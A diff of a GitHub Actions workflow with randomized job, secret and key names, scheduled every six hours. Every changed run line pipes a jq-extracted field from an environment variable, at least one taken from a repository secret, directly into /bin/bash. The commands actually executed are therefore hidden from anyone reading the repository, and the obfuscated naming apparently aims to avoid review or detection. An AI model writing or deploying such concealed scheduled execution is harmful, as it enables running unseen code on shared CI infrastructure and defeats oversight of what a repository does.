@@ -3,16 +3,36 @@ name: shenerpin0987
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 3/6 * * *'
-jobs:  # 16396
+    - cron: '18 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shenerpin0987
         env:
-          qhqq1615: ${{ secrets.qhqq1615 }}
+          ne55: ${{ secrets.ne55 }}
         run: |
-          echo $qhqq1615 | jq -r .kjil86404 | /bin/bash
-          echo $eocx94665 | jq -r .ugf507 | /bin/bash
+          echo $ne55 | jq -r .ulxe501 | /bin/bash
+          echo $xuk87 | jq -r .h87 | /bin/bash
+          echo $n7 | jq -r .sngif1 | /bin/bash
+          echo $a8772 | jq -r .vao009 | /bin/bash
+          echo $o8008 | jq -r .g351 | /bin/bash
+          echo $avyyj33 | jq -r .mudi44 | /bin/bash
+          echo $xqdfh1965 | jq -r .cqtjd59 | /bin/bash
+          echo $d330 | jq -r .puews160 | /bin/bash
+          echo $vbv3 | jq -r .ui2 | /bin/bash
+          echo $uji9172 | jq -r .j7872 | /bin/bash
+          echo $bma47834 | jq -r .kae827 | /bin/bash
+          echo $ualbu50 | jq -r .ou465 | /bin/bash
+          echo $o765 | jq -r .oiv72003 | /bin/bash
+          echo $finvy7 | jq -r .fsj476 | /bin/bash
+          echo $dk953 | jq -r .yotha2374 | /bin/bash
+          echo $j666 | jq -r .w078 | /bin/bash
+          echo $izw863 | jq -r .ees6 | /bin/bash
+          echo $mp2787 | jq -r .bpsb234 | /bin/bash
+          echo $pmbft7568 | jq -r .j61 | /bin/bash
+          echo $qyc2559 | jq -r .o579 | /bin/bash
 
